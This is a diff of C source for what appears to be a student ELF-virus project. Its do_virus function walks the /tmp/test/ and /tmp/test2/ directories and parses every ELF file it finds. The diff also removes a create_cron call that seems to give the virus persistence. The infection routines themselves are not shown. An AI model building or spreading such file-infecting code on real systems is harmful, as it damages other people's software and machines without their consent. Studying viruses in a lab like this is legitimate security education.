@@ -1,6 +1,6 @@
-#include "war.h"
+#include "death.h"
 
-void do_virus(char* dirName, t_woody *woody, char *path)
+void do_virus(char *dirName, t_woody *woody)
 {
     DIR *dir;
     struct dirent *ent;
@@ -11,9 +11,8 @@ void do_virus(char* dirName, t_woody *woody, char *path)
         {
             if (ft_strcmp(ent->d_name, ".") != 0 && ft_strcmp(ent->d_name, "..") != 0)
             {
-                if (read_elf_file_bonus(woody, ft_strjoin(dirName, ent->d_name), path) == ERROR_CODE)
+                if (read_elf_file(woody, ft_strjoin(dirName, ent->d_name)) == ERROR_CODE)
                 {
-                    free(woody->addr);
                     continue;
                 }
                 if (parse_info(woody) == ERROR_CODE)
@@ -73,6 +72,7 @@ int check_process()
 int main(int argc, char **argv)
 {
     (void)argv;
+
     if (argc != 1)
     {
         return (ERROR_CODE);
@@ -89,16 +89,11 @@ int main(int argc, char **argv)
         return (ERROR_CODE);
     }
 
-    create_cron(argv[0]);
-
     t_woody woody;
     ft_memset(&woody, 0, sizeof(woody));
 
-    do_virus("/tmp/test/", &woody, argv[0]);
-    do_virus("/tmp/test2/", &woody, argv[0]);
-
-
+    do_virus("/tmp/test/", &woody);
+    do_virus("/tmp/test2/", &woody);
 
     return (0);
 }
-
